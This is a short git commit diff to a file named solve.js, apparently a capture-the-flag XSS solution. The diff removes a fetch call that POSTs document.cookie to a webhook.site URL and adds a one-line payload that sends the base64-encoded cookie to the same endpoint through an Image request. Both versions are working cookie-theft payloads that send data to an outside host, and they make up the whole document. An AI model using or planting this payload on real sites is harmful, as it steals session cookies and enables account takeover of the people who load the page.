c39267f536d2875c1cebd80ac5b7088193299370
lildawtha <lildawtha@gmail.com>
2025-07-01 22:36:14 +0630

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,5 +1,1 @@
-// xss.js - hosted via jsDelivr
-fetch("https://webhook.site/a7f46279-8331-4e87-80ba-b993f660bfd6", {
-  method: "POST",
-  body: document.cookie
-});
+x = new Image (); x.src = 'https://webhook.site/a7f46279-8331-4e87-80ba-b993f660bfd6?data='+btoa(document.cookie);
